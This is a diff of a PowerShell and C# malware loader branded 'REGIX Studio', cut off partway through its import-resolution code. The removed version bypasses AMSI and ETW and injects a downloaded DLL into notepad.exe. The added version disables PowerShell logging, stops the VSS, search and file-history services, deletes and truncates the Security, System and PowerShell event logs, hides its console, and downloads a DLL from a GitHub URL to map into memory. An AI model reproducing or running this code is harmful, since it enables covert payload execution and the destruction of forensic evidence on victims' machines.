@@ -1,461 +1,623 @@
-<#
-.SYNOPSIS
-  REGIX Studio – PowerShell + C# manual syscall injector.
-  Runs completely in memory, no external dependencies.
-.DESCRIPTION
-  - Bypasses AMSI and ETW.
-  - Verifies the current user by SID and machine HWID.
-  - Downloads a DLL payload from a public GitHub URL.
-  - Compiles an in‑memory C# manual mapper that uses raw Nt* syscalls.
-  - Injects the DLL into a target process (default: notepad.exe).
-#>
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WSearch" -Name "Start" -Value 4 | Out-Null
 
-# ========== 1. AMSI & ETW Bypass ==========
-function Bypass-AMSI {
-    $a = [Ref].Assembly.GetTypes()
-    $amsi = $a | Where-Object { $_.Name -like "*iUtils" }
-    $c = $amsi.GetMethods('NonPublic,Static') | Where-Object { $_.Name -eq 'c' }
-    $c.Invoke($null, @( $null, [IntPtr]::Zero ))
+Stop-Service -Name "WSearch" -Force -ErrorAction SilentlyContinue
+Stop-Service -Name "cbdhsvc*" -Force -ErrorAction SilentlyContinue
+Stop-Service -Name "VSS*" -Force -ErrorAction SilentlyContinue
+Stop-Service -Name "fhsvc*" -Force -ErrorAction SilentlyContinue
+
+$regCommand1 = "reg add 'HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging' /v EnableModuleLogging /t REG_DWORD /d 0 /f"
+$regCommand2 = "reg add 'HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' /v EnableScriptBlockLogging /t REG_DWORD /d 0 /f"
+$regCommand3 = "reg add 'HKLM\SOFTWARE\WOW6432Node\Policies\Microsoft\Windows\PowerShell\ModuleLogging' /v EnableModuleLogging /t REG_DWORD /d 0 /f"
+$regCommand4 = "reg add 'HKLM\SOFTWARE\WOW6432Node\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' /v EnableScriptBlockLogging /t REG_DWORD /d 0 /f"
+
+Invoke-Expression $regCommand1 | Out-Null
+Invoke-Expression $regCommand2 | Out-Null
+Invoke-Expression $regCommand3 | Out-Null
+Invoke-Expression $regCommand4 | Out-Null
+
+Get-ChildItem -Path $env:TEMP -Filter "*.cs"  -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
+Get-ChildItem -Path $env:TEMP -Filter "*.dll" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
+Get-ChildItem -Path $env:TEMP -Filter "*.pdb" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
+Get-ChildItem -Path $env:TEMP -Filter "*.tmp" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
+Get-ChildItem -Path $env:TEMP -Filter "*.ps1" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
+
+Set-StrictMode -Version Latest
+
+$VerbosePreference      = 'SilentlyContinue'
+$DebugPreference        = 'SilentlyContinue'
+$InformationPreference  = 'SilentlyContinue'
+$WarningPreference      = 'SilentlyContinue'
+$ErrorActionPreference  = 'SilentlyContinue'
+$ConfirmPreference      = 'None'
+$WhatIfPreference       = $false
+$PSModuleAutoLoadingPreference = 'None'
+$MaximumHistoryCount    = 0
+
+*> $null
+$Error.Clear()
+
+if (!([bool]([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))) {
+    return
 }
 
-function Patch-ETW {
-    $p = Get-Process -Id $pid
-    $m = $p.Modules | Where-Object { $_.ModuleName -eq "ntdll.dll" }
-    $b = $m.BaseAddress
-    $addr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
-        (Get-ProcAddress $b "EtwEventWrite"),
-        [type]([Delegate]::CreateDelegate([type]"void*", $null))
-    )
-    [System.Runtime.InteropServices.Marshal]::WriteByte($addr, 0xC3)
+Add-Type -Name Window -Namespace Console -MemberDefinition @'
+[DllImport("Kernel32.dll")] public static extern IntPtr GetConsoleWindow();
+[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
+'@ -ErrorAction SilentlyContinue
+[Console.Window]::ShowWindow([Console.Window]::GetConsoleWindow(), 0)
+
+function Invoke-Finalize {
+    try {
+        Get-Variable -Scope Script -ErrorAction SilentlyContinue |
+            Remove-Variable -Scope Script -Force -ErrorAction SilentlyContinue
+        Get-Variable | Where-Object {
+            $_.Name -notmatch '^(PS|ExecutionContext|Host|Error|MyInvocation|PID)$'
+        } | Remove-Variable -Force -ErrorAction SilentlyContinue
+        Clear-Host
+        $Error.Clear()
+        [GC]::Collect()
+        [GC]::WaitForPendingFinalizers()
+        [GC]::Collect()
+        Get-Process | ForEach-Object { $_.MinWorkingSet = $_.MinWorkingSet }
+    } catch {}
 }
 
-Add-Type -TypeDefinition @"
+$ProgressPreference = 'SilentlyContinue'
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
+# =============================================================
+#  LOG WIPER (from Form1 code, converted to static class)
+# =============================================================
+
+$logWiperCode = @'
 using System;
-using System.Runtime.InteropServices;
-public class WinApi {
-    [DllImport("kernel32.dll")]
-    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
-}
-"@
-function Get-ProcAddress($module, $name) {
-    return [WinApi]::GetProcAddress($module, $name)
-}
-
-# Execute bypasses
-Bypass-AMSI
-Patch-ETW
-
-# ========== 2. SID / HWID Verification ==========
-# --- EDIT THESE ARRAYS WITH YOUR ALLOWED USERS ---
-$allowedSIDs = @(
-    "S-1-5-21-123456789-123456789-123456789-1000",   # Your SID
-    "S-1-5-21-987654321-987654321-987654321-500"     # Administrator
-)
-$allowedHWIDs = @(
-    "12345678-1234-1234-1234-123456789abc",          # Your machine UUID
-    "87654321-4321-4321-4321-cba987654321"
-)
-# ------------------------------------------------
-
-$currentSID = (whoami /user | Select-String -Pattern "S-1-\d+-\d+-\d+-\d+-\d+").Matches.Value
-$currentHWID = (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID
-
-if ($allowedSIDs -notcontains $currentSID -or $allowedHWIDs -notcontains $currentHWID) {
-    Write-Output "[-] Unauthorised user or machine. Exiting."
-    exit
-}
-Write-Output "[+] Authorised – proceeding."
-
-# ========== 3. Download DLL from GitHub ==========
-$dllUrl = "https://raw.githubusercontent.com/youruser/yourrepo/main/payload.dll"
-Write-Output "[*] Downloading DLL from $dllUrl"
-try {
-    $dllBytes = (Invoke-WebRequest -Uri $dllUrl -UseBasicParsing).Content
-} catch {
-    Write-Output "[-] Failed to download DLL. Exiting."
-    exit
-}
-Write-Output "[+] DLL size: $($dllBytes.Length) bytes"
-
-# ========== 4. Target Process ==========
-$targetName = "notepad.exe"
-$proc = Get-Process -Name $targetName -ErrorAction SilentlyContinue
-if (-not $proc) {
-    Write-Output "[-] Process $targetName not running. Starting it..."
-    Start-Process -FilePath "notepad.exe" -WindowStyle Hidden
-    Start-Sleep -Seconds 2
-    $proc = Get-Process -Name $targetName
-}
-$pid = $proc[0].Id
-Write-Output "[*] Target PID: $pid"
-
-# ========== 5. C# Manual Mapper (REGIX Studio core) ==========
-$csharpCode = @"
-using System;
-using System.Runtime.InteropServices;
-using System.Diagnostics;
 using System.IO;
-using System.Collections.Generic;
-using System.Linq;
+using System.Runtime.InteropServices;
+using System.ServiceProcess;
+using System.Threading;
+using System.Diagnostics.Eventing.Reader;
 
-public static class ManualMapper
+public static class LogWiper
 {
-    // ---------- Native syscall declarations ----------
-    [DllImport("ntdll.dll")]
-    static extern int NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, uint AllocationType, uint Protect);
-
-    [DllImport("ntdll.dll")]
-    static extern int NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, IntPtr NumberOfBytesToWrite, out IntPtr NumberOfBytesWritten);
-
-    [DllImport("ntdll.dll")]
-    static extern int NtCreateThreadEx(out IntPtr ThreadHandle, uint DesiredAccess, IntPtr ObjectAttributes, IntPtr ProcessHandle, IntPtr StartAddress, IntPtr Parameter, bool CreateSuspended, IntPtr StackSize, IntPtr MaximumStackSize, IntPtr AttributeList);
-
-    [DllImport("ntdll.dll")]
-    static extern int NtWaitForSingleObject(IntPtr Handle, bool Alertable, ref long Timeout);
-
-    [DllImport("ntdll.dll")]
-    static extern int NtFreeVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, uint FreeType);
-
-    [DllImport("ntdll.dll")]
-    static extern int NtReadVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, IntPtr NumberOfBytesToRead, out IntPtr NumberOfBytesRead);
-
-    [DllImport("ntdll.dll")]
-    static extern int NtClose(IntPtr Handle);
-
-    [DllImport("kernel32.dll")]
-    static extern IntPtr LoadLibraryA(string lpLibFileName);
-
-    [DllImport("kernel32.dll")]
-    static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
-
-    // ---------- PE structures ----------
-    [StructLayout(LayoutKind.Sequential)]
-    struct IMAGE_DOS_HEADER {
-        public ushort e_magic;
-        public ushort e_cblp;
-        public ushort e_cp;
-        public ushort e_crlc;
-        public ushort e_cparhdr;
-        public ushort e_minalloc;
-        public ushort e_maxalloc;
-        public ushort e_ss;
-        public ushort e_sp;
-        public ushort e_csum;
-        public ushort e_ip;
-        public ushort e_cs;
-        public ushort e_lfarlc;
-        public ushort e_ovno;
-        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
-        public ushort[] e_res1;
-        public ushort e_oemid;
-        public ushort e_oeminfo;
-        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
-        public ushort[] e_res2;
-        public int e_lfanew;
-    }
-
-    [StructLayout(LayoutKind.Sequential)]
-    struct IMAGE_FILE_HEADER {
-        public ushort Machine;
-        public ushort NumberOfSections;
-        public uint TimeDateStamp;
-        public uint PointerToSymbolTable;
-        public uint NumberOfSymbols;
-        public ushort SizeOfOptionalHeader;
-        public ushort Characteristics;
-    }
-
-    [StructLayout(LayoutKind.Sequential)]
-    struct IMAGE_OPTIONAL_HEADER64 {
-        public ushort Magic;
-        public byte MajorLinkerVersion;
-        public byte MinorLinkerVersion;
-        public uint SizeOfCode;
-        public uint SizeOfInitializedData;
-        public uint SizeOfUninitializedData;
-        public uint AddressOfEntryPoint;
-        public uint BaseOfCode;
-        public ulong ImageBase;
-        public uint SectionAlignment;
-        public uint FileAlignment;
-        public ushort MajorOperatingSystemVersion;
-        public ushort MinorOperatingSystemVersion;
-        public ushort MajorImageVersion;
-        public ushort MinorImageVersion;
-        public ushort MajorSubsystemVersion;
-        public ushort MinorSubsystemVersion;
-        public uint Win32VersionValue;
-        public uint SizeOfImage;
-        public uint SizeOfHeaders;
-        public uint CheckSum;
-        public ushort Subsystem;
-        public ushort DllCharacteristics;
-        public ulong SizeOfStackReserve;
-        public ulong SizeOfStackCommit;
-        public ulong SizeOfHeapReserve;
-        public ulong SizeOfHeapCommit;
-        public uint LoaderFlags;
-        public uint NumberOfRvaAndSizes;
-        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
-        public IMAGE_DATA_DIRECTORY[] DataDirectory;
-    }
-
-    [StructLayout(LayoutKind.Sequential)]
-    struct IMAGE_DATA_DIRECTORY {
-        public uint VirtualAddress;
-        public uint Size;
-    }
-
-    [StructLayout(LayoutKind.Sequential)]
-    struct IMAGE_SECTION_HEADER {
-        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
-        public byte[] Name;
-        public uint VirtualSize;
-        public uint VirtualAddress;
-        public uint SizeOfRawData;
-        public uint PointerToRawData;
-        public uint PointerToRelocations;
-        public uint PointerToLinenumbers;
-        public ushort NumberOfRelocations;
-        public ushort NumberOfLinenumbers;
-        public uint Characteristics;
-    }
-
-    [StructLayout(LayoutKind.Sequential)]
-    struct IMAGE_NT_HEADERS64 {
-        public uint Signature;
-        public IMAGE_FILE_HEADER FileHeader;
-        public IMAGE_OPTIONAL_HEADER64 OptionalHeader;
-    }
-
-    [StructLayout(LayoutKind.Sequential)]
-    struct IMAGE_BASE_RELOCATION {
-        public uint VirtualAddress;
-        public uint SizeOfBlock;
-    }
-
-    [StructLayout(LayoutKind.Sequential)]
-    struct IMAGE_IMPORT_DESCRIPTOR {
-        public uint OriginalFirstThunk;
-        public uint TimeDateStamp;
-        public uint ForwarderChain;
-        public uint Name;
-        public uint FirstThunk;
-    }
-
-    [StructLayout(LayoutKind.Sequential)]
-    struct IMAGE_TLS_DIRECTORY64 {
-        public ulong StartAddressOfRawData;
-        public ulong EndAddressOfRawData;
-        public ulong AddressOfIndex;
-        public ulong AddressOfCallBacks;
-        public uint SizeOfZeroFill;
-        public uint Characteristics;
-    }
-
-    // ---------- Main injection function ----------
-    public static bool Inject(byte[] dllBytes, int pid, bool wipeHeaders = true, bool randomizeBase = true)
+    private static readonly string[] VerifyLogs = new[]
     {
-        IntPtr hProcess;
-        try {
-            hProcess = Process.GetProcessById(pid).Handle;
-        } catch {
-            return false;
-        }
+        "System",
+        "Windows PowerShell",
+        "Microsoft-Windows-PowerShell/Operational",
+        "Security"
+    };
 
-        // 1. Parse PE headers
-        if (dllBytes.Length < Marshal.SizeOf<IMAGE_DOS_HEADER>()) return false;
-        var dos = ByteArrayToStructure<IMAGE_DOS_HEADER>(dllBytes, 0);
-        if (dos.e_magic != 0x5A4D) return false;
+    private static readonly string[] EvtxFiles = new[]
+    {
+        @"C:\Windows\System32\winevt\Logs\System.evtx",
+        @"C:\Windows\System32\winevt\Logs\Windows PowerShell.evtx",
+        @"C:\Windows\System32\winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx",
+        @"C:\Windows\System32\winevt\Logs\Security.evtx"
+    };
 
-        int ntOffset = dos.e_lfanew;
-        var nt = ByteArrayToStructure<IMAGE_NT_HEADERS64>(dllBytes, ntOffset);
-        if (nt.Signature != 0x4550) return false;
+    private const string EventLogServiceName = "EventLog";
+    private const int MOVEFILE_DELAY_UNTIL_REBOOT = 0x4;
 
-        var opt = nt.OptionalHeader;
-        uint imageSize = opt.SizeOfImage;
-        ulong entryPoint = opt.AddressOfEntryPoint;
+    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+    private static extern bool MoveFileEx(string lpExistingFileName, string lpNewFileName, int dwFlags);
 
-        // 2. Allocate memory in target (RWX)
-        IntPtr baseAddr = IntPtr.Zero;
-        IntPtr regionSize = (IntPtr)imageSize;
-        uint allocType = 0x1000 | 0x2000; // MEM_COMMIT | MEM_RESERVE
-        uint protect = 0x40;              // PAGE_EXECUTE_READWRITE
+    public static void Wipe()
+    {
+        bool serviceWasRunning = false;
+        try
+        {
+            if (!IsAdmin()) return;
 
-        int status = NtAllocateVirtualMemory(hProcess, ref baseAddr, IntPtr.Zero, ref regionSize, allocType, protect);
-        if (status != 0) return false;
+            serviceWasRunning = IsServiceRunning(EventLogServiceName);
 
-        // 3. Write headers
-        IntPtr bytesWritten;
-        status = NtWriteVirtualMemory(hProcess, baseAddr, dllBytes, (IntPtr)opt.SizeOfHeaders, out bytesWritten);
-        if (status != 0) { Cleanup(hProcess, baseAddr); return false; }
-
-        // 4. Write sections
-        int sectionOffset = ntOffset + Marshal.SizeOf<IMAGE_NT_HEADERS64>();
-        for (int i = 0; i < nt.FileHeader.NumberOfSections; i++) {
-            var sec = ByteArrayToStructure<IMAGE_SECTION_HEADER>(dllBytes, sectionOffset + i * Marshal.SizeOf<IMAGE_SECTION_HEADER>());
-            if (sec.SizeOfRawData > 0) {
-                byte[] rawData = new byte[sec.SizeOfRawData];
-                Array.Copy(dllBytes, sec.PointerToRawData, rawData, 0, sec.SizeOfRawData);
-                status = NtWriteVirtualMemory(hProcess, baseAddr + sec.VirtualAddress, rawData, (IntPtr)sec.SizeOfRawData, out bytesWritten);
-                if (status != 0) { Cleanup(hProcess, baseAddr); return false; }
+            if (serviceWasRunning)
+            {
+                try { StopService(EventLogServiceName, 15000); } catch { }
+                Thread.Sleep(1000);
             }
-        }
 
-        // 5. Process relocations
-        ulong delta = (ulong)baseAddr - opt.ImageBase;
-        if (delta != 0) {
-            var relocDir = opt.DataDirectory[5]; // IMAGE_DIRECTORY_ENTRY_BASERELOC
-            if (relocDir.Size > 0) {
-                uint relocAddr = relocDir.VirtualAddress;
-                while (relocAddr < relocDir.VirtualAddress + relocDir.Size) {
-                    var reloc = ByteArrayToStructure<IMAGE_BASE_RELOCATION>(dllBytes, (int)relocAddr);
-                    if (reloc.SizeOfBlock == 0) break;
-                    int count = (int)(reloc.SizeOfBlock - 8) / 2;
-                    int entriesOffset = (int)relocAddr + 8;
-                    for (int j = 0; j < count; j++) {
-                        ushort entry = BitConverter.ToUInt16(dllBytes, entriesOffset + j * 2);
-                        if ((entry >> 12) == 10) { // IMAGE_REL_BASED_DIR64
-                            uint offset = entry & 0xFFF;
-                            IntPtr patchAddr = baseAddr + (int)reloc.VirtualAddress + (int)offset;
-                            byte[] buffer = new byte[8];
-                            NtReadVirtualMemory(hProcess, patchAddr, buffer, (IntPtr)8, out _);
-                            ulong oldValue = BitConverter.ToUInt64(buffer, 0);
-                            ulong newValue = oldValue + delta;
-                            byte[] newBuf = BitConverter.GetBytes(newValue);
-                            NtWriteVirtualMemory(hProcess, patchAddr, newBuf, (IntPtr)8, out _);
+            foreach (var path in EvtxFiles)
+            {
+                try { WipeEvtxFile(path); } catch { }
+            }
+
+            if (serviceWasRunning)
+            {
+                try { StartService(EventLogServiceName, 15000); } catch { }
+                Thread.Sleep(2500);
+            }
+
+            foreach (var logName in VerifyLogs)
+            {
+                try
+                {
+                    var q = new EventLogQuery(logName, PathType.LogName);
+                    using (var reader = new EventLogReader(q))
+                    {
+                        int count = 0;
+                        EventRecord rec;
+                        while ((rec = reader.ReadEvent()) != null && count < 5)
+                        {
+                            count++;
+                            rec.Dispose();
                         }
                     }
-                    relocAddr += reloc.SizeOfBlock;
                 }
+                catch { }
             }
         }
+        catch { }
+        finally
+        {
+            try
+            {
+                if (serviceWasRunning && !IsServiceRunning(EventLogServiceName))
+                {
+                    try { StartService(EventLogServiceName, 15000); } catch { }
+                }
+            }
+            catch { }
+        }
+    }
 
-        // 6. Resolve imports
-        var importDir = opt.DataDirectory[1]; // IMAGE_DIRECTORY_ENTRY_IMPORT
-        if (importDir.Size > 0) {
-            uint importAddr = importDir.VirtualAddress;
-            while (true) {
-                var impDesc = ByteArrayToStructure<IMAGE_IMPORT_DESCRIPTOR>(dllBytes, (int)importAddr);
-                if (impDesc.Name == 0) break;
-                string dllName = GetStringFromRVA(dllBytes, impDesc.Name);
-                IntPtr hModule = LoadLibraryA(dllName);
-                if (hModule == IntPtr.Zero) { Cleanup(hProcess, baseAddr); return false; }
+    private static void WipeEvtxFile(string path)
+    {
+        try
+        {
+            if (!File.Exists(path)) return;
 
-                uint thunk = (impDesc.OriginalFirstThunk != 0) ? impDesc.OriginalFirstThunk : impDesc.FirstThunk;
-                uint firstThunk = impDesc.FirstThunk;
-                while (true) {
-                    uint thunkValue = BitConverter.ToUInt32(dllBytes, (int)thunk);
-                    if (thunkValue == 0) break;
-                    IntPtr funcAddr;
-                    if ((thunkValue & 0x80000000) != 0) { // Ordinal import
-                        ushort ordinal = (ushort)(thunkValue & 0xFFFF);
-                        funcAddr = GetProcAddress(hModule, (string)null); // not supported here
-                    } else {
-                        string funcName = GetStringFromRVA(dllBytes, (uint)(thunkValue + 2));
-                        funcAddr = GetProcAddress(hModule, funcName);
+            File.SetAttributes(path, FileAttributes.Normal);
+            File.Delete(path);
+            return;
+        }
+        catch { }
+
+        try
+        {
+            string renamed = path + ".re4per_" + DateTime.Now.Ticks;
+            File.Move(path, renamed);
+
+            try
+            {
+                File.SetAttributes(renamed, FileAttributes.Normal);
+                File.Delete(renamed);
+            }
+            catch { }
+            return;
+        }
+        catch { }
+
+        try
+        {
+            if (!MoveFileEx(path, null, MOVEFILE_DELAY_UNTIL_REBOOT))
+            {
+                TruncateEvtx(path);
+            }
+        }
+        catch
+        {
+            TruncateEvtx(path);
+        }
+    }
+
+    private static void TruncateEvtx(string path)
+    {
+        try
+        {
+            using (var fs = new FileStream(path, FileMode.Open, FileAccess.Write, FileShare.ReadWrite))
+            {
+                fs.SetLength(0);
+                fs.Flush();
+            }
+        }
+        catch { }
+    }
+
+    private static bool IsAdmin()
+    {
+        var id = System.Security.Principal.WindowsIdentity.GetCurrent();
+        var p = new System.Security.Principal.WindowsPrincipal(id);
+        return p.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
+    }
+
+    private static bool IsServiceRunning(string name)
+    {
+        try
+        {
+            using (var sc = new ServiceController(name))
+            {
+                return sc.Status == ServiceControllerStatus.Running;
+            }
+        }
+        catch { return false; }
+    }
+
+    private static void StopService(string name, int timeoutMs)
+    {
+        using (var sc = new ServiceController(name))
+        {
+            if (sc.Status != ServiceControllerStatus.Stopped &&
+                sc.Status != ServiceControllerStatus.StopPending)
+            {
+                sc.Stop();
+            }
+            sc.WaitForStatus(ServiceControllerStatus.Stopped, TimeSpan.FromMilliseconds(timeoutMs));
+        }
+    }
+
+    private static void StartService(string name, int timeoutMs)
+    {
+        using (var sc = new ServiceController(name))
+        {
+            if (sc.Status != ServiceControllerStatus.Running &&
+                sc.Status != ServiceControllerStatus.StartPending)
+            {
+                sc.Start();
+            }
+            sc.WaitForStatus(ServiceControllerStatus.Running, TimeSpan.FromMilliseconds(timeoutMs));
+        }
+    }
+}
+'@
+
+try {
+    Add-Type -TypeDefinition $logWiperCode -ErrorAction Stop -ReferencedAssemblies "System.ServiceProcess", "System.Core"
+} catch { }
+
+# =============================================================
+#  NATIVE MAPPER
+# =============================================================
+
+$dllUrl = "https://raw.githubusercontent.com/official-jahid/engine-bios-panel/refs/heads/main/regix.dll"
+
+$loaderCode = @'
+using System;
+using System.Runtime.InteropServices;
+using System.Text;
+
+public class ManualMapResult
+{
+    public IntPtr ImageBase;
+    public uint ImageSize;
+    public IntPtr DllMainAddr;
+    public IntPtr CrtInitAddr;
+    public long Delta;
+    public bool Is64Bit;
+}
+
+public static class NativeLoader
+{
+    [DllImport("kernel32.dll", SetLastError = true)]
+    static extern IntPtr VirtualAlloc(IntPtr a, UIntPtr s, uint t, uint p);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern bool VirtualFree(IntPtr a, UIntPtr s, uint t);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);
+
+    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
+    static extern IntPtr GetProcAddress(IntPtr h, string n);
+
+    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
+    static extern IntPtr GetProcAddress(IntPtr h, IntPtr o);
+
+    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
+    static extern IntPtr GetModuleHandleA(string n);
+
+    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
+    static extern IntPtr LoadLibraryA(string n);
+
+    [DllImport("kernel32.dll")]
+    static extern bool FlushInstructionCache(IntPtr h, IntPtr a, UIntPtr s);
+
+    [DllImport("kernel32.dll")]
+    static extern IntPtr GetCurrentProcess();
+
+    const uint MEM_COMMIT = 0x1000;
+    const uint MEM_RESERVE = 0x2000;
+    const uint MEM_RELEASE = 0x8000;
+    const uint PAGE_READWRITE = 0x04;
+    const uint PAGE_EXECUTE_READ = 0x20;
+    const uint PAGE_EXECUTE_READWRITE = 0x40;
+    const uint PAGE_READONLY = 0x02;
+    const uint PAGE_EXECUTE = 0x10;
+
+    static ushort U16(byte[] b, int o) { return BitConverter.ToUInt16(b, o); }
+    static uint   U32(byte[] b, int o) { return BitConverter.ToUInt32(b, o); }
+    static ulong  U64(byte[] b, int o) { return BitConverter.ToUInt64(b, o); }
+
+    static uint   RU32(IntPtr p, long o) { return (uint)Marshal.ReadInt32((IntPtr)(p.ToInt64() + o)); }
+    static ushort RU16(IntPtr p, long o) { return (ushort)Marshal.ReadInt16((IntPtr)(p.ToInt64() + o)); }
+    static ulong  RU64(IntPtr p, long o)
+    {
+        long lo = (long)(uint)Marshal.ReadInt32((IntPtr)(p.ToInt64() + o));
+        long hi = (long)(uint)Marshal.ReadInt32((IntPtr)(p.ToInt64() + o + 4));
+        return (ulong)((hi << 32) | lo);
+    }
+    static void WU64(IntPtr p, long o, ulong v) { Marshal.WriteInt64((IntPtr)(p.ToInt64() + o), (long)v); }
+    static void WU32(IntPtr p, long o, uint v)  { Marshal.WriteInt32((IntPtr)(p.ToInt64() + o), (int)v); }
+
+    static string RAscii(IntPtr p, long o)
+    {
+        var sb = new StringBuilder();
+        for (int i = 0; i < 260; i++)
+        {
+            byte b = Marshal.ReadByte((IntPtr)(p.ToInt64() + o + i));
+            if (b == 0) break;
+            sb.Append((char)b);
+        }
+        return sb.ToString();
+    }
+
+    static uint SProt(uint ch)
+    {
+        bool x = (ch & 0x20000000) != 0;
+        bool w = (ch & 0x80000000) != 0;
+        bool r = (ch & 0x40000000) != 0;
+        if (x && w) return PAGE_EXECUTE_READWRITE;
+        if (x && r) return PAGE_EXECUTE_READ;
+        if (x)      return PAGE_EXECUTE;
+        if (w)      return PAGE_READWRITE;
+        if (r)      return PAGE_READONLY;
+        return PAGE_READONLY;
+    }
+
+    struct Sec { public uint VS, VA, SRD, PRD, Ch; }
+
+    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+    delegate bool DllMainFn(IntPtr h, uint r, IntPtr p);
+
+    public static ManualMapResult Map(byte[] dll, bool callEntry)
+    {
+        var res = new ManualMapResult();
+        if (dll == null || dll.Length < 0x100) throw new Exception("Payload too small");
+        if (U16(dll, 0) != 0x5A4D) throw new Exception("Invalid MZ");
+
+        int lfa = BitConverter.ToInt32(dll, 0x3C);
+        if (U32(dll, lfa) != 0x4550u) throw new Exception("Invalid PE");
+
+        int co = lfa + 4;
+        ushort ns = U16(dll, co + 2);
+        ushort ohs = U16(dll, co + 16);
+        int oo = co + 20;
+
+        bool is64 = (U16(dll, oo) == 0x020B);
+        res.Is64Bit = is64;
+
+        bool hostIs64 = IntPtr.Size == 8;
+        if (is64 != hostIs64) throw new Exception("Architecture mismatch");
+
+        uint ep  = U32(dll, oo + 16);
+        uint soi = U32(dll, oo + 56);
+        uint soh = U32(dll, oo + 60);
+        ulong ib = is64 ? U64(dll, oo + 24) : U32(dll, oo + 28);
+        res.ImageSize = soi;
+
+        int dd = is64 ? oo + 112 : oo + 96;
+        uint irva = U32(dll, dd + 8);
+        uint rrva = U32(dll, dd + 40);
+        uint rsz  = U32(dll, dd + 44);
+        uint eraw = U32(dll, dd + 0);
+
+        int st = oo + ohs;
+        var secs = new Sec[ns];
+        for (int i = 0; i < ns; i++)
+        {
+            int b = st + i * 40;
+            secs[i] = new Sec
+            {
+                VS  = U32(dll, b + 8),
+                VA  = U32(dll, b + 12),
+                SRD = U32(dll, b + 16),
+                PRD = U32(dll, b + 20),
+                Ch  = U32(dll, b + 36)
+            };
+        }
+
+        IntPtr img = VirtualAlloc(IntPtr.Zero, (UIntPtr)soi, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        if (img == IntPtr.Zero) throw new Exception("VirtualAlloc failed");
+        res.ImageBase = img;
+
+        long ab = img.ToInt64();
+        long delta = ab - (long)ib;
+        res.Delta = delta;
+
+        Marshal.Copy(dll, 0, img, (int)soh);
+
+        foreach (var s in secs)
+        {
+            if (s.SRD == 0) continue;
+            uint cs = s.VS == 0 ? s.SRD : Math.Min(s.SRD, s.VS);
+            if (s.PRD + cs > (uint)dll.Length)
+            {
+                cs = (uint)dll.Length - s.PRD;
+                if (cs == 0) continue;
+            }
+            Marshal.Copy(dll, (int)s.PRD, (IntPtr)(ab + s.VA), (int)cs);
+        }
+
+        if (rrva != 0 && delta != 0)
+        {
+            uint ro = rrva;
+            uint re = rrva + rsz;
+            while (ro < re)
+            {
+                uint pg = RU32(img, ro);
+                uint bs = RU32(img, ro + 4);
+                if (bs == 0) break;
+                int ne = (int)(bs - 8) / 2;
+                for (int i = 0; i < ne; i++)
+                {
+                    ushort e = RU16(img, ro + 8 + i * 2);
+                    int ty = (e >> 12) & 0xF;
+                    int of = e & 0xFFF;
+                    if (ty == 0) continue;
+                    long tr = pg + of;
+                    if (ty == 10)
+                    {
+                        ulong c = RU64(img, tr);
+                        WU64(img, tr, (ulong)((long)c + delta));
                     }
-                    if (funcAddr == IntPtr.Zero) { Cleanup(hProcess, baseAddr); return false; }
-                    byte[] addrBytes = BitConverter.GetBytes((ulong)funcAddr);
-                    NtWriteVirtualMemory(hProcess, baseAddr + (int)firstThunk, addrBytes, (IntPtr)8, out _);
-                    thunk += 8;
-                    firstThunk += 8;
+                    else if (ty == 3)
+                    {
+                        uint c = RU32(img, tr);
+                        WU32(img, tr, (uint)((long)c + delta));
+                    }
                 }
-                importAddr += (uint)Marshal.SizeOf<IMAGE_IMPORT_DESCRIPTOR>();
+                ro += bs;
             }
         }
 
-        // 7. TLS callbacks (simplified – we skip calling them because they are rare)
-        // In a full implementation, you would iterate over the callback array and execute them.
-        // For this tool, we skip TLS to keep code shorter.
+        if (irva != 0)
+        {
+            int ie = 0;
+            while (true)
+            {
+                long eo = irva + ie * 20;
+                uint nr  = RU32(img, eo + 12);
